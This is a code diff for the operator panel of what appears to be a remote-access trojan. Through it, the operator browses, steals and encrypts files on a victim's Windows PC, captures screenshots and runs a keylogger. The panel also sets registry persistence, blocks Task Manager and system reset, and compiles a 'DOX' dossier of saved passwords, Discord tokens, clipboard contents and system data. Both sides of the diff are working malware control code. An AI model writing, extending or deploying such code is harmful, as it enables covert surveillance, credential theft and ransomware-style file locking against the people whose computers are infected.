+async function loadNet(){const el=document.getElementById('netOut');el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Loading net...</div>';const r=await saw('network_info','',el,'netErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
+async function loadSvc(){const el=document.getElementById('svcOut');el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Loading services...</div>';const r=await saw('services','',el,'svcErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
+async function loadApps(){const el=document.getElementById('appOut');el.style.display='';el.innerHTML='<div class="loading"><span class="sp"></span>Listing apps...</div>';const r=await saw('installed_apps','',el,'appErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
 
-// === Files ===
 let g_fp='',g_fl=false;
-async function browseDir(path){
-  if(g_fl)return;g_fl=true;try{path=decodeURIComponent(path)}catch{}
-  const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';
-  el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';
-  const r=await saw('file_list',path,el,'filesErr');
-  if(r&&r.result){g_fp=path||'';renderFiles(r.result)}else if(r===null){el.innerHTML='<div class="loading">No response</div>'}
-  g_fl=false;
-}
-function renderFiles(json){
-  const el=document.getElementById('filesB');let e;try{e=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}
-  if(!Array.isArray(e)){el.innerHTML='<div class="loading">Bad response</div>';return}
-  g_fe=e;let html='<div class="path"><span>'+esc(g_fp||'This PC')+'</span>';
-  if(g_fp)html+='<button class="btn btn-g btn-sm" onclick="browseDir(\'\')">Root</button>';
-  if(g_fp){const p=g_fp.replace(/\\+$/,'');const idx=p.lastIndexOf('\\');if(idx>0)html+='<button class="btn btn-g btn-sm" onclick="browseDir(\''+uenc(p.substr(0,idx+1))+'\')">Up</button>'}
-  html+='</div>';
-  for(let i=0;i<e.length;i++){
-  const en=e[i],nm=en.n||'?',isd=en.d===true||en.d==='true',sz=en.s||0,dt=en.m||'';
-  const szs=sz<1024?sz+'B':sz<1048576?(sz/1024).toFixed(1)+'KB':(sz/1048576).toFixed(1)+'MB';
-  const fp=g_fp+nm;
-  html+='<div class="entry'+(isd?' dir':'')+'"><div class="ico '+(isd?'f':'fl')+'" onclick="'+(isd?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+(isd?'📁':'📄')+'</div>';
-  html+='<div class="nm" onclick="'+(isd?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+esc(nm)+'</div>';
-  html+=isd?'<div class="sz"></div>':'<div class="sz">'+szs+'</div>';
-  html+='<div class="dt">'+esc(dt)+'</div>';
-  if(!isd){html+='<div class="acts"><button class="btn-xs" onclick="fDown('+i+')" title="DL">⬇</button><button class="btn-xs" onclick="fRen('+i+')" title="Rename">✏</button><button class="btn-xs" onclick="fDel('+i+')" title="Delete">🗑</button><button class="btn-xs" onclick="fEnc('+i+')" title="Encrypt">🔒</button>'+(nm.endsWith('.locked')?'<button class="btn-xs" onclick="fDec('+i+')" title="Decrypt">🔓</button>':'')+'</div>'}
-  else{html+='<div class="acts"><button class="btn-xs" onclick="fRen('+i+')" title="Rename">✏</button><button class="btn-xs" onclick="fDel('+i+')" title="Delete">🗑</button></div>'}
-  html+='</div>'}
-  el.innerHTML=html;
-}
+async function browseDir(path){if(g_fl)return;g_fl=true;try{path=decodeURIComponent(path)}catch{}const el=document.getElementById('filesB');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';const r=await saw('file_list',path,el,'filesErr');if(r&&r.result){g_fp=path||'';renderFiles(r.result)}else if(r===null){el.innerHTML='<div class="loading">No response</div>'}g_fl=false}
+function renderFiles(json){const el=document.getElementById('filesB');let e;try{e=JSON.parse(json)}catch{el.innerHTML='<div class="loading">Parse error</div>';return}if(!Array.isArray(e)){el.innerHTML='<div class="loading">Bad response</div>';return}g_fe=e;let html='<div class="path"><span>'+esc(g_fp||'This PC')+'</span>';if(g_fp)html+='<button class="btn btn-g btn-sm" onclick="browseDir(\'\')">Root</button>';if(g_fp){const p=g_fp.replace(/\\+$/,'');const idx=p.lastIndexOf('\\');if(idx>0)html+='<button class="btn btn-g btn-sm" onclick="browseDir(\''+uenc(p.substr(0,idx+1))+'\')">Up</button>'}html+='</div>';for(let i=0;i<e.length;i++){const en=e[i],nm=en.n||'?',isd=en.d===true||en.d==='true',sz=en.s||0,dt=en.m||'';const szs=sz<1024?sz+'B':sz<1048576?(sz/1024).toFixed(1)+'KB':(sz/1048576).toFixed(1)+'MB';const fp=g_fp+nm;html+='<div class="entry'+(isd?' dir':'')+'"><div class="ico '+(isd?'f':'fl')+'" onclick="'+(isd?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+(isd?'&#128193;':'&#128196;')+'</div>';html+='<div class="nm" onclick="'+(isd?"browseDir('"+uenc(fp+'\\')+"')":'')+'">'+esc(nm)+'</div>';html+=isd?'<div class="sz"></div>':'<div class="sz">'+szs+'</div>';html+='<div class="dt">'+esc(dt)+'</div>';if(!isd){html+='<div class="acts"><button class="btn-xs" onclick="fDown('+i+')" title="DL">&#11015;</button><button class="btn-xs" onclick="fRen('+i+')" title="Rename">&#9998;</button><button class="btn-xs" onclick="fDel('+i+')" title="Delete">&#128465;</button><button class="btn-xs" onclick="fEnc('+i+')" title="Encrypt">&#128274;</button>'+(nm.endsWith('.locked')?'<button class="btn-xs" onclick="fDec('+i+')" title="Decrypt">&#128275;</button>':'')+'</div>'}else{html+='<div class="acts"><button class="btn-xs" onclick="fRen('+i+')" title="Rename">&#9998;</button><button class="btn-xs" onclick="fDel('+i+')" title="Delete">&#128465;</button></div>'}html+='</div>'}el.innerHTML=html}
 function rf(){if(!g_fe||!Array.isArray(g_fe))return;renderFiles(JSON.stringify(g_fe))}
-async function fDel(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Delete "'+nm+'"?'))return;const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Deleting...</div>';const r=await saw('file_delete',p,el,'filesErr');if(r){g_fe.splice(i,1);rf()}}
-async function fRen(i){if(!g_fe||!g_fe[i])return;const old=g_fe[i].n||'';const n=prompt('New name:',old);if(!n||n===old)return;const p=g_fp+old;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Renaming...</div>';const r=await saw('file_rename',JSON.stringify({path:p,name:n}),el,'filesErr');if(r){g_fe[i].n=n;rf()}}
-async function fEnc(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Encrypt "'+nm+'"?'))return;const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Encrypting...</div>';const r=await saw('file_encrypt',p,el,'filesErr');if(r){g_fe[i].n=nm+'.locked';rf()}}
-async function fDec(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Decrypt "'+nm+'"?'))return;const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Decrypting...</div>';const r=await saw('file_decrypt',p,el,'filesErr');if(r){if(nm.endsWith('.locked'))g_fe[i].n=nm.slice(0,-7);else g_fe[i].n+='.unlocked';rf()}}
-async function fDown(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';const p=g_fp+nm;const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">DL '+esc(nm)+'...</div>';const r=await saw('file_download',p,el,'filesErr');if(r&&r.result&&!r.result.startsWith('err:')){const bin=atob(r.result);const arr=new Uint8Array(bin.length);for(let j=0;j<bin.length;j++)arr[j]=bin.charCodeAt(j);const blob=new Blob([arr]);const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=nm;a.click();URL.revokeObjectURL(a.href);toast('Downloaded '+nm)}else if(r)el.innerHTML='<div class="loading">'+esc(r.result||'Failed')+'</div>'}
-async function upFile(file){const p=g_fp+file.name;const reader=new FileReader();reader.onload=async function(e){const b64=e.target.result.split(',')[1];const el=document.getElementById('filesB');const ee=document.getElementById('filesErr');ee.style.display='none';el.innerHTML='<div class="loading">Upload '+esc(file.name)+'...</div>';const r=await saw('file_upload',JSON.stringify({path:p,data:b64}),el,'filesErr');if(r){if(g_fe&&Array.isArray(g_fe)){g_fe.push({n:file.name,s:Math.round(b64.length*0.75),m:new Date().toISOString().slice(0,10),d:false});rf()}else browseDir(g_fp)}};reader.readAsDataURL(file)}
+async function fDel(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Delete "'+nm+'"?'))return;const r=await saw('file_delete',g_fp+nm,document.getElementById('filesB'),'filesErr');if(r){g_fe.splice(i,1);rf()}}
+async function fRen(i){if(!g_fe||!g_fe[i])return;const old=g_fe[i].n||'';const n=prompt('New name:',old);if(!n||n===old)return;const r=await saw('file_rename',JSON.stringify({path:g_fp+old,name:n}),document.getElementById('filesB'),'filesErr');if(r){g_fe[i].n=n;rf()}}
+async function fEnc(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Encrypt "'+nm+'"?'))return;const r=await saw('file_encrypt',g_fp+nm,document.getElementById('filesB'),'filesErr');if(r){g_fe[i].n=nm+'.locked';rf()}}
+async function fDec(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';if(!confirm('Decrypt "'+nm+'"?'))return;const r=await saw('file_decrypt',g_fp+nm,document.getElementById('filesB'),'filesErr');if(r){if(nm.endsWith('.locked'))g_fe[i].n=nm.slice(0,-7);else g_fe[i].n+='.unlocked';rf()}}
+async function fDown(i){if(!g_fe||!g_fe[i])return;const nm=g_fe[i].n||'';const r=await saw('file_download',g_fp+nm,document.getElementById('filesB'),'filesErr');if(r&&r.result&&!r.result.startsWith('err:')){const bin=atob(r.result);const arr=new Uint8Array(bin.length);for(let j=0;j<bin.length;j++)arr[j]=bin.charCodeAt(j);const blob=new Blob([arr]);const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=nm;a.click();URL.revokeObjectURL(a.href);toast('Downloaded '+nm)}else if(r)document.getElementById('filesB').innerHTML='<div class="loading">'+esc(r.result||'Failed')+'</div>'}
+async function upFile(file){const p=g_fp+file.name;const reader=new FileReader();reader.onload=async function(e){const b64=e.target.result.split(',')[1];const el=document.getElementById('filesB');el.innerHTML='<div class="loading">Upload '+esc(file.name)+'...</div>';const r=await saw('file_upload',JSON.stringify({path:p,data:b64}),el,'filesErr');if(r){if(g_fe&&Array.isArray(g_fe)){g_fe.push({n:file.name,s:Math.round(b64.length*0.75),m:new Date().toISOString().slice(0,10),d:false});rf()}else browseDir(g_fp)}};reader.readAsDataURL(file)}
 function handleDrop(e){e.preventDefault();document.getElementById('dropZ').classList.remove('drag');for(let f of e.dataTransfer.files)upFile(f)}
 function handleFP(i){for(let f of i.files)upFile(f);i.value=''}
 
-// === Host Info ===
-async function loadHost(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading host...</div>';const r=await saw('host_info','',el,'hostErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('hostGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+esc(d.user||'?')+'</div><div class="l">User</div></div>';h+='<div class="card"><div class="v">'+esc(d.os||'?')+'</div><div class="l">OS</div></div>';h+='<div class="card"><div class="v">'+esc(d.arch||'?')+'</div><div class="l">Arch</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';h+='<div class="card"><div class="v">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="l">Uptime</div></div>';if(d.gpus)h+='<div class="card"><div class="v" style="font-size:.85rem">'+esc(d.gpus)+'</div><div class="l">GPU</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f).toFixed(1)+' GB</div><div class="l">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--green)">✓ Host info loaded</div>'}catch(e){el.innerHTML='<div class="loading">Parse error</div>'}}}
-async function loadEnv(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading env...</div>';const r=await saw('env_vars','',el,'hostErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
-async function takeSSAll(){const el=document.getElementById('hostOut');const ee=document.getElementById('hostErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Capturing...</div>';const r=await saw('screenshot_all','',el,'hostErr');if(r&&r.result){const parts=r.result.split('===MON:');parts.forEach((p,i)=>{if(i===0)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+p+'">';else{const m=p.split('===\n');el.innerHTML+='<div class="smol">Mon '+m[0]+'</div><img class="img-out" src="data:image/jpeg;base64,'+m[1]+'">'}})}}
+async function loadHost(){const el=document.getElementById('hostOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading host...</div>';const r=await saw('host_info','',el,'hostErr');if(r&&r.result){try{const d=JSON.parse(r.result);const g=document.getElementById('hostGrid');g.style.display='grid';let h='';h+='<div class="card"><div class="v">'+esc(d.host||'?')+'</div><div class="l">Hostname</div></div>';h+='<div class="card"><div class="v">'+esc(d.user||'?')+'</div><div class="l">User</div></div>';h+='<div class="card"><div class="v">'+esc(d.os||'?')+'</div><div class="l">OS</div></div>';h+='<div class="card"><div class="v">'+esc(d.arch||'?')+'</div><div class="l">Arch</div></div>';h+='<div class="card"><div class="v">'+d.cores+'</div><div class="l">CPU Cores</div></div>';h+='<div class="card"><div class="v">'+(d.ram/1024).toFixed(1)+' GB</div><div class="l">RAM</div></div>';h+='<div class="card"><div class="v">'+(d.ram_free/1024).toFixed(1)+' GB</div><div class="l">RAM Free</div></div>';h+='<div class="card"><div class="v">'+Math.floor(d.uptime/3600)+'h '+Math.floor((d.uptime%3600)/60)+'m</div><div class="l">Uptime</div></div>';if(d.gpus)h+='<div class="card"><div class="v" style="font-size:.85rem">'+esc(d.gpus)+'</div><div class="l">GPU</div></div>';if(d.disks&&d.disks.length)d.disks.forEach(dk=>{const pct=dk.t>0?((dk.t-dk.f)/dk.t*100).toFixed(0):0;h+='<div class="card"><div class="v">'+dk.d+': '+(dk.f).toFixed(1)+' GB</div><div class="l">'+(dk.v||'Drive')+' of '+dk.t+' GB</div><div class="disk-bar"><div class="fill" style="width:'+pct+'%"></div></div></div>'});g.innerHTML=h;el.innerHTML='<div style="color:var(--green)">Host info loaded</div>'}catch{el.innerHTML='<div class="loading">Parse error</div>'}}}
+async function loadEnv(){const el=document.getElementById('hostOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading env...</div>';const r=await saw('env_vars','',el,'hostErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem">'+esc(r.result)+'</pre>'}
+async function takeSSAll(){const el=document.getElementById('hostOut');el.innerHTML='<div class="loading"><span class="sp"></span>Capturing...</div>';const r=await saw('screenshot_all','',el,'hostErr');if(r&&r.result)el.innerHTML='<img class="img-out" src="data:image/jpeg;base64,'+r.result+'">'}
 
-// === Keylogger ===
-async function startKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Starting...</div>';const r=await saw('keylog_start','',el,'klErr');if(r){document.getElementById('klStart').style.display='none';document.getElementById('klStop').style.display='';document.getElementById('klStat').textContent='● Running';el.innerHTML='<div style="color:var(--green)">Keylogger started</div>';toast('Keylogger started')}}
-async function stopKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';const r=await saw('keylog_stop','',el,'klErr');if(r){document.getElementById('klStart').style.display='';document.getElementById('klStop').style.display='none';document.getElementById('klStat').textContent='Stopped';el.innerHTML='<div style="color:var(--green)">Stopped</div>'}}
-async function dumpKL(){const el=document.getElementById('klOut');const ee=document.getElementById('klErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Dumping...</div>';const r=await saw('keylog_dump','',el,'klErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem;line-height:1.4">'+esc(r.result)+'</pre>'}
+async function startKL(){const r=await saw('keylog_start','',document.getElementById('klOut'),'klErr');if(r){document.getElementById('klStart').style.display='none';document.getElementById('klStop').style.display='';document.getElementById('klStat').textContent='Running';document.getElementById('klOut').innerHTML='<div style="color:var(--green)">Keylogger started</div>';toast('Keylogger started')}}
+async function stopKL(){const r=await saw('keylog_stop','',document.getElementById('klOut'),'klErr');if(r){document.getElementById('klStart').style.display='';document.getElementById('klStop').style.display='none';document.getElementById('klStat').textContent='Stopped';document.getElementById('klOut').innerHTML='<div style="color:var(--green)">Stopped</div>'}}
+async function dumpKL(){const el=document.getElementById('klOut');el.innerHTML='<div class="loading"><span class="sp"></span>Dumping...</div>';const r=await saw('keylog_dump','',el,'klErr');if(r&&r.result)el.innerHTML='<pre style="white-space:pre-wrap;margin:0;font-size:.72rem;line-height:1.4">'+esc(r.result)+'</pre>'}
 
-// === Activity Log ===
-async function loadLog(){const el=document.getElementById('logOut');const ee=document.getElementById('logErr');ee.style.display='none';el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity</div>';return}let h='';d.reverse().forEach(e=>{const t=new Date(e.t).toLocaleTimeString();h+='<div style="font-size:.68rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--text2)">'+t+'</span> <span style="color:var(--accent)">'+esc(e.type)+'</span> <span>'+esc(e.computer)+'</span> <span style="color:var(--text2)">'+esc(e.detail||'')+'</span></div>'});el.innerHTML=h}catch(e){el.innerHTML='<div class="loading">Error</div>'}}
+async function loadLog(){const el=document.getElementById('logOut');el.innerHTML='<div class="loading"><span class="sp"></span>Loading...</div>';try{const r=await fetch(FB+'/logs.json?limit=200');const d=await r.json();if(!d||!d.length){el.innerHTML='<div class="loading">No activity</div>';return}let h='';d.reverse().forEach(e=>{const t=new Date(e.t).toLocaleTimeString();h+='<div style="font-size:.68rem;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.03)"><span style="color:var(--t2)">'+t+'</span> <span style="color:var(--cyan)">'+esc(e.type)+'</span> <span>'+esc(e.computer)+'</span> <span style="color:var(--t2)">'+esc(e.detail||'')+'</span></div>'});el.innerHTML=h}catch{el.innerHTML='<div class="loading">Error</div>'}}
 
-// === Settings ===
 document.getElementById('setPCName').textContent=computer;
-async function loadSettings(){
-  const el=document.getElementById('setErr');el.style.display='none';
-  const r=await saw('startup_status','','setErr','setErr');
-  if(r&&r.result){try{const d=JSON.parse(r.result);const btn=document.getElementById('setStartupBtn');const txt=document.getElementById('setStartupTxt');if(d.enabled){btn.textContent='ON';btn.className='btn btn-p btn-sm';txt.textContent=d.active?'Running - auto boot':'Registry set';txt.style.color=d.active?'var(--green)':'var(--orange)'}else{btn.textContent='OFF';btn.className='btn btn-g btn-sm';txt.textContent='Not in startup';txt.style.color='var(--text2)'}}catch{}}
-  const p=document.getElementById('setPersistTxt');
-  p.textContent='Active';p.style.color='var(--green)';
-}
-async function toggleStartup(){
-  const btn=document.getElementById('setStartupBtn');
-  const isOn=btn.textContent==='ON';
-  const r=await saw(isOn?'startup_off':'startup_on','','setErr','setErr');
-  if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.className='btn btn-p btn-sm';t.textContent=d.active?'Running':'Registry set';t.style.color=d.active?'var(--green)':'var(--orange)'}else{b.textContent='OFF';b.className='btn btn-g btn-sm';t.textContent='Not in startup';t.style.color='var(--text2)'}}catch{}}
-}
-async function toggleTaskmgr(){
-  const chk=document.getElementById('setTaskmgrChk');
-  const r=await saw(chk.checked?'taskmgr_on':'taskmgr_off','','setErr','setErr');
-  if(r&&r.result==='ok'){
-    document.getElementById('setTaskmgrTxt').textContent=chk.checked?'Blocked':'Unblocked';
-    document.getElementById('setTaskmgrTxt').style.color=chk.checked?'var(--orange)':'var(--text2)';
-  } else { chk.checked=!chk.checked; }
-}
-async function toggleReset(){
-  const chk=document.getElementById('setResetChk');
-  const r=await saw(chk.checked?'reset_on':'reset_off','','setErr','setErr');
-  if(r&&r.result==='ok'){
-    document.getElementById('setResetTxt').textContent=chk.checked?'Blocked':'Unblocked';
-    document.getElementById('setResetTxt').style.color=chk.checked?'var(--orange)':'var(--text2)';
-  } else { chk.checked=!chk.checked; }
-}
-async function uninstallClient(){
-  if(!confirm('UNINSTALL: Remove the client from remote PC?'))return;
-  if(!confirm('Are you sure?'))return;
-  await saw('uninstall','','setErr','setErr');
-  document.getElementById('setErr').textContent='Uninstall sent - client will self-delete';
-  document.getElementById('setErr').style.display='';
-}
+async function loadSettings(){const el=document.getElementById('setErr');el.style.display='none';const r=await saw('startup_status','','setErr','setErr');if(r&&r.result){try{const d=JSON.parse(r.result);const btn=document.getElementById('setStartupBtn');const txt=document.getElementById('setStartupTxt');if(d.enabled){btn.textContent='ON';btn.className='btn btn-p btn-sm';txt.textContent=d.active?'Running - auto boot':'Registry set';txt.style.color=d.active?'var(--green)':'var(--orange)'}else{btn.textContent='OFF';btn.className='btn btn-g btn-sm';txt.textContent='Not in startup';txt.style.color='var(--t2)'}}catch{}}const p=document.getElementById('setPersistTxt');p.textContent='Active';p.style.color='var(--green)'}
+async function toggleStartup(){const btn=document.getElementById('setStartupBtn');const isOn=btn.textContent==='ON';const r=await saw(isOn?'startup_off':'startup_on','','setErr','setErr');if(r&&r.result){try{const d=JSON.parse(r.result);const b=document.getElementById('setStartupBtn');const t=document.getElementById('setStartupTxt');if(d.enabled){b.textContent='ON';b.className='btn btn-p btn-sm';t.textContent=d.active?'Running':'Registry set';t.style.color=d.active?'var(--green)':'var(--orange)'}else{b.textContent='OFF';b.className='btn btn-g btn-sm';t.textContent='Not in startup';t.style.color='var(--t2)'}}catch{}}}
+async function toggleTaskmgr(){const chk=document.getElementById('setTaskmgrChk');const r=await saw(chk.checked?'taskmgr_on':'taskmgr_off','','setErr','setErr');if(r&&r.result==='ok'){document.getElementById('setTaskmgrTxt').textContent=chk.checked?'Blocked':'Unblocked';document.getElementById('setTaskmgrTxt').style.color=chk.checked?'var(--orange)':'var(--t2)'}else{chk.checked=!chk.checked}}
+async function toggleReset(){const chk=document.getElementById('setResetChk');const r=await saw(chk.checked?'reset_on':'reset_off','','setErr','setErr');if(r&&r.result==='ok'){document.getElementById('setResetTxt').textContent=chk.checked?'Blocked':'Unblocked';document.getElementById('setResetTxt').style.color=chk.checked?'var(--orange)':'var(--t2)'}else{chk.checked=!chk.checked}}
+async function uninstallClient(){if(!confirm('UNINSTALL: Remove client from remote PC?'))return;if(!confirm('Are you sure?'))return;await saw('uninstall','','setErr','setErr');document.getElementById('setErr').textContent='Uninstall sent - client will self-delete';document.getElementById('setErr').style.display=''}
 async function setLiveMon(){const m=document.getElementById('setLiveMon').value;await saw('live_monitor',m,'setErr','setErr')}
 async function setLiveQ(){const q=document.getElementById('setQuality').value;await saw('live_config',JSON.stringify({quality:parseInt(q)}),'setErr','setErr')}
 async function setLiveS(){const s=document.getElementById('setScale').value;await saw('live_config',JSON.stringify({scale:parseFloat(s)}),'setErr','setErr')}
 
-// === DOX ===
-const doxTasks=[
-  {id:'doxHost',type:'host_info',label:'Host Info'},
-  {id:'doxSys',type:'system_info',label:'System Info'},
-  {id:'doxNet',type:'network_info',label:'Network Info'},
-  {id:'doxPw',type:'passwords',label:'Passwords'},
-  {id:'doxTok',type:'discord_tokens',label:'Discord Tokens'},
-  {id:'doxEnv',type:'env_vars',label:'Environment Variables'},
-  {id:'doxProc',type:'process_list',label:'Processes'},
-  {id:'doxSvc',type:'services',label:'Services'},
-  {id:'doxApps',type:'installed_apps',label:'Installed Apps'},
-  {id:'doxClip',type:'clipboard',label:'Clipboard'},
-];
-async function runDox(){
-  const btn=document.getElementById('doxBtn');btn.disabled=true;btn.textContent='Collecting...';
-  const prog=document.getElementById('doxProgress');prog.style.display='';
-  const bar=document.getElementById('doxBar');const log=document.getElementById('doxLog');const st=document.getElementById('doxStatus');
-  log.innerHTML='';bar.style.width='0%';
-  const selected=doxTasks.filter(t=>document.getElementById(t.id).checked);
-  let results={};let done=0;
-  const ts=new Date().toISOString().replace(/[:.]/g,'-');
-  log.innerHTML+='<div style="color:var(--accent)">Starting dossier for '+esc(computer)+'...</div>';
-  for(const task of selected){
-    done++;bar.style.width=Math.round(done/selected.length*100)+'%';
-    st.textContent=task.label+'...';
-    log.innerHTML+='<div style="color:var(--text2)">├ '+esc(task.label)+': requesting...</div>';
-    log.scrollTop=log.scrollHeight;
-    try{
-      const r=await saw(task.type,'',null,null);
-      if(r&&r.result){results[task.label]=r.result;log.innerHTML+='<div style="color:var(--green)">├ '+esc(task.label)+': OK ('+r.result.length+' chars)</div>'}
-      else{results[task.label]='(no data)';log.innerHTML+='<div style="color:var(--orange)">├ '+esc(task.label)+': empty</div>'}
-    }catch(e){results[task.label]='(error)';log.innerHTML+='<div style="color:var(--red)">├ '+esc(task.label)+': error</div>'}
-    log.scrollTop=log.scrollHeight;
-  }
-  bar.style.width='100%';
-  log.innerHTML+='<div style="color:var(--green);margin-top:4px">Done! Generating...</div>';
-  let txt='═══════════════════════════════════════════════════════\n';
-  txt+='  DOSSIER: '+computer+'\n';
-  txt+='  Generated: '+new Date().toLocaleString()+'\n';
-  txt+='═══════════════════════════════════════════════════════\n\n';
-  for(const[key,val]of Object.entries(results)){
-    txt+='--- '+key.toUpperCase()+' ---\n';
-    txt+=(val||'(empty)')+'\n\n';
-  }
-  txt+='═══════════════════════════════════════════════════════\n';
-  txt+='  END OF DOSSIER\n';
-  txt+='═══════════════════════════════════════════════════════\n';
-  const blob=new Blob([txt],{type:'text/plain'});
-  const a=document.createElement('a');a.href=URL.createObjectURL(blob);
-  a.download='DOX_'+computer+'_'+ts+'.txt';
-  a.click();URL.revokeObjectURL(a.href);
-  st.textContent='Downloaded!';
-  log.innerHTML+='<div style="color:var(--green)">✓ Dossier saved</div>';
-  btn.disabled=false;btn.textContent='Generate';
-  toast('Dossier downloaded');
-}
+const doxTasks=[{id:'doxHost',type:'host_info',label:'Host Info'},{id:'doxSys',type:'system_info',label:'System Info'},{id:'doxNet',type:'network_info',label:'Network Info'},{id:'doxPw',type:'passwords',label:'Passwords'},{id:'doxTok',type:'discord_tokens',label:'Discord Tokens'},{id:'doxEnv',type:'env_vars',label:'Environment Variables'},{id:'doxProc',type:'process_list',label:'Processes'},{id:'doxSvc',type:'services',label:'Services'},{id:'doxApps',type:'installed_apps',label:'Installed Apps'},{id:'doxClip',type:'clipboard',label:'Clipboard'}];
+async function runDox(){const btn=document.getElementById('doxBtn');btn.disabled=true;btn.textContent='Collecting...';const prog=document.getElementById('doxProgress');prog.style.display='';const bar=document.getElementById('doxBar');const log=document.getElementById('doxLog');const st=document.getElementById('doxStatus');log.innerHTML='';bar.style.width='0%';const selected=doxTasks.filter(t=>document.getElementById(t.id).checked);let results={};let done=0;const ts=new Date().toISOString().replace(/[:.]/g,'-');log.innerHTML+='<div style="color:var(--cyan)">Starting dossier for '+esc(computer)+'...</div>';for(const task of selected){done++;bar.style.width=Math.round(done/selected.length*100)+'%';st.textContent=task.label+'...';log.innerHTML+='<div style="color:var(--t2)">'+esc(task.label)+': requesting...</div>';log.scrollTop=log.scrollHeight;try{const r=await saw(task.type,'',null,null);if(r&&r.result){results[task.label]=r.result;log.innerHTML+='<div style="color:var(--green)">'+esc(task.label)+': OK ('+r.result.length+' chars)</div>'}else{results[task.label]='(no data)';log.innerHTML+='<div style="color:var(--orange)">'+esc(task.label)+': empty</div>'}}catch{results[task.label]='(error)';log.innerHTML+='<div style="color:var(--red)">'+esc(task.label)+': error</div>'}log.scrollTop=log.scrollHeight}bar.style.width='100%';log.innerHTML+='<div style="color:var(--green);margin-top:4px">Done! Generating...</div>';let txt='DOSSIER: '+computer+'\nGenerated: '+new Date().toLocaleString()+'\n'+'='.repeat(50)+'\n\n';for(const[key,val]of Object.entries(results)){txt+='--- '+key.toUpperCase()+' ---\n'+(val||'(empty)')+'\n\n'}txt+='='.repeat(50)+'\nEND OF DOSSIER\n';const blob=new Blob([txt],{type:'text/plain'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='DOX_'+computer+'_'+ts+'.txt';a.click();URL.revokeObjectURL(a.href);st.textContent='Downloaded!';log.innerHTML+='<div style="color:var(--green)">Dossier saved</div>';btn.disabled=false;btn.textContent='Generate';toast('Dossier downloaded')}
 
